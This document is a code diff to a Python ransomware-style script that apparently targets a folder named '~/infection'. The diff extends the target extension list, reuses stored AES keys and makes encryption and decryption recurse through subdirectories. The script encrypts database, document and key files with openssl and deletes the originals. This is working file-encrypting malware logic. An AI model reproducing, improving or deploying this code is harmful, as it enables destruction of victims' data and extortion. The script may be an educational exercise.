@@ -15,34 +15,40 @@ _TARGET_EXTENSIONS_=(
     "mdf", "ibd", "myi", "myd", "frm", "odb", "dbf", "db", "mdb", "accdb", "sql", "sqlitedb",
     "sqlite3", "asc", "lay6", "lay", "mml", "sxm", "otg", "odg", "uop", "std", "sxd", "otp",
     "odp", "wb2", "slk", "dif", "stc", "sxc", "ots", "ods", "3dm", "max", "3ds", "uot", "stw",
-    "sxw", "ott", "odt", "pem", "p12", "csr", "crt", "key", "pfx", "der"
+    "sxw", "ott", "odt", "pem", "p12", "csr", "crt", "key", "pfx", "der", "py"
 )
 
 
 def encryptionssl(args):
-    key = secrets.token_hex(32)  # 32 bytes = 256 bits for AES-256
-    iv = secrets.token_hex(16)   # 16 bytes = 128 bits for IV
-
-    with open("key.txt", "w") as f:
-        f.write(key)
-    with open("iv.txt", "w") as f:
-        f.write(iv)
+    # Check if key and iv files exist
+    if os.path.exists("key.txt") and os.path.exists("iv.txt"):
+        with open("key.txt") as f:
+            key = f.read().strip()
+        with open("iv.txt") as f:
+            iv = f.read().strip()
+    else:
+        key = secrets.token_hex(32)  # 32 bytes = 256 bits for AES-256
+        iv = secrets.token_hex(16)   # 16 bytes = 128 bits for IV
+        with open("key.txt", "w") as f:
+            f.write(key)
+        with open("iv.txt", "w") as f:
+            f.write(iv)
 
     folder = os.path.expanduser("~/infection")
-    for filename in os.listdir(folder):
-        if filename.lower().endswith(_TARGET_EXTENSIONS_):
-            filepath = os.path.join(folder, filename)
-        else:
-            continue
-        if os.path.isfile(filepath):
-            encrypted_path = filepath + ".ft"
-            subprocess.run([
-                "openssl", "enc", "-aes-256-cbc", "-K", key, "-iv", iv,
-                "-in", filepath, "-out", encrypted_path
-            ])
-            if not args.silent:
-                print("Encrypted file:", filepath,  )
-            os.remove(filepath)
+    files_to_encrypt = []
+    for root, dirs, files in os.walk(folder):
+        for filename in files:
+            if filename.lower().endswith(_TARGET_EXTENSIONS_):
+                files_to_encrypt.append(os.path.join(root, filename))
+    for filepath in files_to_encrypt:
+        encrypted_path = filepath + ".ft"
+        subprocess.run([
+            "openssl", "enc", "-aes-256-cbc", "-K", key, "-iv", iv,
+            "-in", filepath, "-out", encrypted_path
+        ])
+        if not args.silent:
+            print("Encrypted file:", filepath)
+        os.remove(filepath)
 
 def decryptssl(args):
 # Decrypt
@@ -51,14 +57,17 @@ def decryptssl(args):
         key = f.read().strip()
     with open("iv.txt") as f:
         iv = f.read().strip()
-    for filename in os.listdir(folder):
-        if filename.endswith(".ft"):
-            encrypted_path = os.path.join(folder, filename)
-            decrypted_path = encrypted_path[:-3]  # remove '.ft'
-            subprocess.run([
-                "openssl", "enc", "-d", "-aes-256-cbc", "-K", key, "-iv", iv,
-                "-in", encrypted_path, "-out", decrypted_path
-            ])
-            if not args.silent:
-                print("decrypted file: ",filename)
-            os.remove(encrypted_path)
+    files_to_decrypt = []
+    for root, dirs, files in os.walk(folder):
+        for filename in files:
+            if filename.endswith(".ft"):
+                files_to_decrypt.append(os.path.join(root, filename))
+    for encrypted_path in files_to_decrypt:
+        decrypted_path = encrypted_path[:-3]
+        subprocess.run([
+            "openssl", "enc", "-d", "-aes-256-cbc", "-K", key, "-iv", iv,
+            "-in", encrypted_path, "-out", decrypted_path
+        ])
+        if not args.silent:
+            print("Decrypted file:", os.path.basename(encrypted_path))
+        os.remove(encrypted_path)
